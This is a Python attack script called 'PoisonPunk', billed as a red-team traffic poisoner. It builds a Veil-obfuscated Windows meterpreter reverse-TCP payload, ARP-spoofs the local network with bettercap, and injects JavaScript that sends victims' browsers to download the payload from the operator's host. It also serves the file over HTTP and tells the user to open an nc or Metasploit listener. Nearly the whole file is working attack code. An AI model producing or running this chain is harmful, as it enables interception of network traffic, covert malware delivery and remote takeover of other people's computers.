#!/usr/bin/env python3

import subprocess
import sys
import time
import os
import logging

POISONPUNK_LOGO = """
   ██████╗  ██████╗ ██╗███████╗ ██████╗ ███╗   ██╗██████╗ ██╗   ██╗███╗   ██╗██╗  ██╗
   ██╔══██╗██╔═══██╗██║██╔════╝██╔═══██╗████╗  ██║██╔══██╗██║   ██║████╗  ██║██║ ██╔╝
   ██████╔╝██║   ██║██║███████╗██║   ██║██╔██╗ ██║██████╔╝██║   ██║██╔██╗ ██║█████╔╝ 
   ██╔═══╝ ██║   ██║██║╚════██║██║   ██║██║╚██╗██║██╔═══╝ ██║   ██║██║╚██╗██║██╔═██╗ 
   ██║     ╚██████╔╝██║███████║╚██████╔╝██║ ╚████║██║     ╚██████╔╝██║ ╚████║██║  ██╗
   ╚═╝      ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝
   -----------------------------------------------------------------------------------
      POISONPUNK - Red Team Traffic Poisoner | MITM & Exploit | Powered by Kali
   -----------------------------------------------------------------------------------
"""

logging.basicConfig(filename="poisonpunk.log", level=logging.INFO, format="%(asctime)s | %(levelname)s | %(message)s")
logger = logging.getLogger("PoisonPunk")

IFACE = "eth0"  # Adjust for your interface
LHOST = input("Enter your public IP or hostname: ").strip()
LPORT = "4444"
PAYLOAD_FILE = "/tmp/poisonpunk_veil.exe"

def generate_veil_payload():
    try:
        logger.info(f"Generating Veil payload: {PAYLOAD_FILE}")
        veil_cmd = f"use Evasion\nuse windows/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT {LPORT}\nset use_arya Y\ngenerate\nset output_file {PAYLOAD_FILE}\nexecute\nexit"
        with open("veil.rc", "w") as f:
            f.write(veil_cmd)
        subprocess.run(["veil", "-r", "veil.rc"], check=True)
        if not os.path.exists(PAYLOAD_FILE):
            raise FileNotFoundError
        logger.info(f"Payload generated: {PAYLOAD_FILE}")
    except Exception as e:
        logger.error(f"Payload generation failed: {e}")
        sys.exit(1)

def poison_network():
    try:
        logger.info("Starting ARP poisoning with bettercap...")
        subprocess.Popen(["bettercap", "-iface", IFACE, "-caplet", "arp.spoof"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.Popen(["bettercap", "-iface", IFACE, "-caplet", "http.proxy", "-script", "inject.js"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        with open("inject.js", "w") as f:
            f.write(f"document.location='http://{LHOST}/poison.exe';")
        
        subprocess.Popen(["python3", "-m", "http.server", "80"], cwd="/tmp")
        logger.info("Network poisoning and web server running")
    except Exception as e:
        logger.error(f"Poisoning failed: {e}")
        sys.exit(1)

def main():
    print(POISONPUNK_LOGO)
    logger.info("PoisonPunk initialized")
    
    generate_veil_payload()
    poison_network()
    
    print(f"[!] Move {PAYLOAD_FILE} to /tmp and rename to poison.exe")
    print("[!] Start listener: 'nc -lvp 4444' or Metasploit")
    print("[!] Run on a network you control—wait for target to connect")
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        logger.info("User interrupted")
        for f in ["veil.rc", "inject.js"]:
            if os.path.exists(f):
                os.remove(f)
        sys.exit(0)

if __name__ == "__main__":
    main()